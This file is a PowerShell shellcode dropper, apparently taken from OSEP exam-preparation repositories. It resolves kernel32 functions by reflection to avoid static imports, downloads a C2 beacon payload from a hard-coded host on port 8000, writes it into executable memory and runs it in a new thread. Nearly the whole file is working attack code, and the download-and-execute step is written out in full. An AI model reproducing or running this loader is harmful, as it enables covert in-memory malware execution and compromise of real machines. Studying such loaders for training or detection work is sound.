# Source from: 
# - https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Injector/Shellcode%20Process%20Injector.ps1
# - https://github.com/r4ulcl/Mythic-OSEP-CheatSheet/blob/main/scripts/auxConfig/dropperx32.ps1


function LookupFunc {
   Param ($moduleName, $functionName)

   $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

   $tmp = @()
   $assem.GetMethods() | ForEach-Object { if ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
   return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
   Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
   )

   $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

   return $type.CreateType()
}

# Download shellcode
$Shellcode = (New-Object System.Net.WebClient).DownloadData("http://192.168.235.130:8000/osep-material/beacons/apollo.bin")

# VirtualAlloc
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc),
    (getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr]))
)
$lpMem = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)

# Copy shellcode to memory
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $lpMem, $Shellcode.Length)

# CreateThread
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateThread),
    (getDelegateType @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]) ([IntPtr]))
)
$hThread = $CreateThread.Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# WaitForSingleObject
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WaitForSingleObject),
    (getDelegateType @([IntPtr],[UInt32]) ([UInt32]))
)
$WaitForSingleObject.Invoke($hThread, [uint32]::MaxValue)
